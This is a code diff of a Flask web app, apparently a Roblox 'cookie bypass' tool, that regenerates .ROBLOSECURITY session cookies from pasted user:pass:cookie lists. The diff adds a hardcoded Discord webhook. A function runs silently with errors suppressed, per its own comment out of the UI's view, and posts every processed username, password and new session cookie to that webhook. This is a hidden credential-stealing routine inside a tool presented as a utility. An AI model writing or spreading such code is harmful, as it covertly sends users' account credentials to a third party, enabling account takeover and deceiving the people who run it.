@@ -12,27 +12,29 @@ import requests
 
 app = Flask(__name__)
 
-# Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
-DISCORD_WEBHOOK_URL = ""
+# Cấu hình Discord Webhook chạy ngầm (để trống "" nếu không dùng)
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR"
+PING_EVERYONE = True
+DISCORD_INVITE_URL = "https://discord.gg/vVUz3rJzmK"
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
 TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
 REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"
 
 
-class RefreshError(Exception):
+class BypassError(Exception):
     pass
 
 
-class Bypass:
+class CookieBypass:
     def __init__(self, cookie: str, proxies: dict | None = None, timeout: int = 30):
-        self.cookie = cookie
+        self.cookie = cookie.strip()
         self.timeout = timeout
         self.session = requests.Session()
         if proxies:
             self.session.proxies.update(proxies)
 
-    def start_process(self) -> str:
+    def run(self) -> str:
         csrf = self._get_csrf_token()
         ticket = self._get_authentication_ticket(csrf)
         return self._redeem(ticket)
@@ -45,7 +47,7 @@ class Bypass:
         )
         token = r.headers.get("x-csrf-token")
         if not token:
-            raise RefreshError("no x-csrf-token (invalid/expired cookie?)")
+            raise BypassError("no x-csrf-token (invalid or expired cookie)")
         return token
 
     def _get_authentication_ticket(self, csrf: str) -> str:
@@ -62,7 +64,7 @@ class Bypass:
         )
         ticket = r.headers.get("rbx-authentication-ticket")
         if not ticket:
-            raise RefreshError(f"no auth ticket (status {r.status_code})")
+            raise BypassError(f"no auth ticket (status {r.status_code})")
         return ticket
 
     def _redeem(self, ticket: str) -> str:
@@ -74,25 +76,41 @@ class Bypass:
         )
         new_cookie = r.cookies.get(".ROBLOSECURITY")
         if not new_cookie:
-            raise RefreshError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
+            raise BypassError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
         return new_cookie
 
 
-def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
+def send_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
     url = (DISCORD_WEBHOOK_URL or "").strip()
     if not url or not content.strip():
         return
 
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"output_refreshed_{ts}.txt"
+    filename = f"bypassed_cookies_{ts}.txt"
+    prefix_ping = "@everyone " if PING_EVERYONE else ""
     payload = {
-        "content": f"Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công."
+        "content": f"{prefix_ping}Bypass cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
+        "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
     }
-    files = {
-        "file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
-    }
+    raw_bytes = content.encode("utf-8")
+
     try:
-        requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=20)
+        resp = requests.post(
+            url,
+            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
+            files={"files[0]": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
+            timeout=20,
+        )
+        if resp.status_code not in (200, 204):
+            requests.post(
+                url,
+                data={
+                    "content": payload["content"],
+                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
+                },
+                files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
+                timeout=20,
+            )
     except Exception:
         pass
 
@@ -110,27 +128,30 @@ def normalize_proxy(raw: str) -> str:
     return f"http://{raw}"
 
 
-def parse_account(line: str):
-    parts = line.strip().split(":", 2)
-    if len(parts) != 3:
+def parse_line(line: str):
+    line = line.strip()
+    if not line or line.startswith("#"):
         return None
-    u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
-    if not u or not c:
-        return None
-    return u, p, c
+    if ":" in line:
+        parts = line.split(":", 2)
+        if len(parts) == 3:
+            u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
+            if c:
+                return u or "account", p, c
+    return "cookie", "", line
 
 
-def refresh_one(user: str, password: str, cookie: str, proxies: list[str]):
+def bypass_one(user: str, password: str, cookie: str, proxies: list[str]):
     proxy = random.choice(proxies) if proxies else ""
     proxy_dict = {"http": proxy, "https": proxy} if proxy else None
     try:
-        new_cookie = Bypass(cookie, proxy_dict).start_process()
+        new_cookie = CookieBypass(cookie, proxy_dict).run()
         if new_cookie == cookie:
-            raise RefreshError("cookie unchanged")
+            raise BypassError("cookie unchanged")
         return user, password, new_cookie, None
     except requests.RequestException as e:
         return user, password, cookie, f"network: {e.__class__.__name__}"
-    except RefreshError as e:
+    except BypassError as e:
         return user, password, cookie, str(e)
 
 
@@ -140,25 +161,25 @@ def now_str() -> str:
 
 @app.route("/")
 def index():
-    return render_template("index.html")
+    return render_template("index.html", discord_url=DISCORD_INVITE_URL)
 
 
-@app.route("/api/refresh", methods=["POST"])
-def api_refresh():
+@app.route("/api/bypass", methods=["POST"])
+def api_bypass():
     payload = request.get_json(force=True)
-    raw_accounts = [ln.strip() for ln in payload.get("accounts", "").splitlines() if ln.strip() and not ln.strip().startswith("#")]
-    accounts = [a for a in (parse_account(ln) for ln in raw_accounts) if a]
+    raw_lines = payload.get("accounts", "").splitlines()
+    items = [x for x in (parse_line(ln) for ln in raw_lines) if x]
     proxies = [p for p in (normalize_proxy(ln) for ln in payload.get("proxies", "").splitlines()) if p]
     threads = max(1, min(50, int(payload.get("threads", 15))))
     keep_failed = bool(payload.get("keepFailed", False))
 
     def stream():
-        if not accounts:
-            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không có account hợp lệ (user:pass:cookie)'})}\n\n"
+        if not items:
+            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không tìm thấy cookie hoặc user:pass:cookie hợp lệ'})}\n\n"
             return
 
         q = queue.Queue()
-        total = len(accounts)
+        total = len(items)
         out_lines = []
         ok_counter = 0
         state_lock = threading.Lock()
@@ -168,17 +189,24 @@ def api_refresh():
             kw["time"] = now_str()
             q.put(kw)
 
+        def format_success(u, p, new_c):
+            return f"{u}:{p}:{new_c}" if p or u != "cookie" else new_c
+
+        def format_fail(u, p, old_c, err):
+            base = f"{u}:{p}:{old_c}" if p or u != "cookie" else old_c
+            return base if keep_failed else f"{base} | {err}"
+
         def worker(u, p, c):
             nonlocal ok_counter
-            user, password, new_cookie, err = refresh_one(u, p, c, proxies)
+            user, password, new_cookie, err = bypass_one(u, p, c, proxies)
             if err is None:
-                line = f"{user}:{password}:{new_cookie}"
+                line = format_success(user, password, new_cookie)
                 with state_lock:
                     ok_counter += 1
                     out_lines.append(line)
-                push("success", username=user, line=line, msg="Refreshed OK")
+                push("success", username=user, line=line, msg="Bypass OK")
             else:
-                fail_line = f"{user}:{password}:{c}" if keep_failed else f"{user}:{password}:{c} | {err}"
+                fail_line = format_fail(user, password, c, err)
                 if keep_failed:
                     with state_lock:
                         out_lines.append(fail_line)
@@ -186,20 +214,20 @@ def api_refresh():
 
         def runner():
             push("start", total=total)
-            push("log", msg=f"{total} accounts · {len(proxies)} proxies · {min(threads, total)} threads")
+            push("log", level="info", msg=f"Bắt đầu {total} cookies · {len(proxies)} proxies · {min(threads, total)} threads")
             with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
-                futs = [pool.submit(worker, u, p, c) for (u, p, c) in accounts]
+                futs = [pool.submit(worker, u, p, c) for (u, p, c) in items]
                 for f in as_completed(futs):
                     try:
                         f.result()
                     except Exception as e:
-                        push("log", msg=f"Thread error: {e}")
+                        push("log", level="err", msg=f"Thread error: {e}")
 
             with state_lock:
                 joined_out = "\n".join(out_lines)
                 ok_total = ok_counter
 
-            send_refreshed_to_webhook_silent(joined_out, ok_total, total)
+            send_webhook_silent(joined_out, ok_total, total)
             push("done")
 
         threading.Thread(target=runner, daemon=True).start()
